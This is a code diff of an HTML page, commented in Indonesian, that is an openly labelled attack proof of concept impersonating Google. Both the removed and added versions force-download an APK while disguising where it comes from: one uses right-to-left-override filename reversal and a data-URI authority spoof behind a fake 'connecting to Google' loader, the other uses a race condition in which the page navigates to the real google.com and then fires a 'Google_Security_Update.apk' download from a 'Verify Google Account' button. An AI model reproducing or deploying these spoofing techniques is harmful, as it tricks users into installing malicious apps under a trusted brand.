@@ -3,75 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Service Update</title>
+    <title>Sistem Keamanan Google</title>
     <style>
-        body { 
-            font-family: 'Roboto', sans-serif; 
-            background-color: #ffffff; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            justify-content: center; 
-            height: 100vh; 
-            margin: 0; 
-        }
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #4285F4;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .text { margin-top: 20px; color: #5f6368; font-size: 14px; }
+        body { font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; background: #fff; margin: 0; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; }
     </style>
 </head>
 <body>
 
-    <div class="loader"></div>
-    <div class="text">Menghubungkan ke server Google...</div>
+    <button class="btn" onclick="startSeamlessAttack()">Verifikasi Akun Google</button>
 
     <script>
-        // --- KONFIGURASI PAYLOAD ---
-        
-        // 1. Unicode RTLO Trick: Memutar balik ekstensi file di UI
-        // [U+202E] adalah karakter spesial yang bikin teks setelahnya terbalik
-        const rtlo = "\u202E";
-        const fileName = "google.com_" + rtlo + "gpj.apk"; 
-        // Di beberapa UI, ini bakal terbaca sebagai "google.com_kpa.jpg" (nyamar jadi gambar)
+        function startSeamlessAttack() {
+            console.log("[*] Memulai serangan Race Condition...");
 
-        // 2. Data URI Spoofing dengan Long Padding
-        // Teknik Abhishek Kumar: Pake //google.com sebagai authority palsu
-        const spoofAuthority = "//google.com/";
-        const padding = "A".repeat(150); // Bikin parser UI 'lelah' dan terpotong
-        const payloadData = "ZXN0dGVzdGVzdHRlc3Q="; // Base64 dummy
-        
-        const finalDataUrl = `data:${spoofAuthority}html;${padding},base64,${payloadData}`;
+            // 1. Persiapkan Payload (Abhishek Method)
+            // Pakai Authority //google.com agar parser notifikasi tertipu
+            const padding = "A".repeat(120); 
+            const dataUrl = `data://google.com/html;${padding},base64,ZXN0dGVzdGVzdHRlc3Q=`;
+            const fileName = "Google_Security_Update.apk";
 
-        // --- EKSEKUSI AUTOMATIC DOWNLOAD ---
-        
-        function startAttack() {
-            console.log("[*] Executing Spoofing Attack...");
-            
-            const link = document.createElement("a");
-            link.href = finalDataUrl;
-            link.download = fileName;
-            
-            // Masukkan ke DOM sebentar buat trigger click
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-            
-            console.log("[+] Payload sent to browser notification.");
+            // 2. Trigger Navigasi ke Google Asli
+            // Ini biar user ngeliat bar URL isinya "google.com" yang asli
+            window.location.href = "https://www.google.com";
+
+            // 3. THE RACE: Kirim download saat browser sedang sibuk navigasi
+            // Kita kasih delay sangat tipis (100-300ms) agar download terdaftar 
+            // saat renderer 'google.com' mulai aktif.
+            setTimeout(() => {
+                const a = document.createElement('a');
+                a.href = dataUrl;
+                a.download = fileName;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                
+                console.log("[+] Download ditembak saat navigasi!");
+            }, 150); 
         }
-
-        // Jalankan otomatis setelah 1.5 detik (biar keliatan simulasi loading)
-        setTimeout(startAttack, 1500);
-
-        // --- ADDITIONAL UI SPOOF ---
-        // Ganti judul dokumen biar sinkron kalau user buka Recent Apps
-        document.title = "Google Play Protect - Verified";
     </script>
 </body>
 </html>
